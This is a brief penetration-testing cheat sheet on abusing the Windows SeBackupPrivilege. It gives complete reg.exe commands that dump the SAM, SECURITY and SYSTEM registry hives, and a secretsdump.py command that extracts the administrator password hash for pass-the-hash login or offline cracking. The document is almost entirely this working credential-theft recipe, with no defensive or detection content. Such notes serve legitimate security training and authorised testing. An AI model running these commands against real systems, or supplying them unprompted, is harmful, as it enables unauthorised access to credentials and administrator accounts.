# SeBackupPrivilege

SeBackupPrivilege - Enabled

This privilege allows the user to read all the files in the system.

Getting SYSTEM, SAM, SECURITY files -> Extract administrator hash -> login with pth or you can crack it

```
C:> reg.exe save hklm\sam c:\windows\temp\sam.save
C:> reg.exe save hklm\security c:\windows\temp\security.save
C:> reg.exe save hklm\system c:\windows\temp\system.save

$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
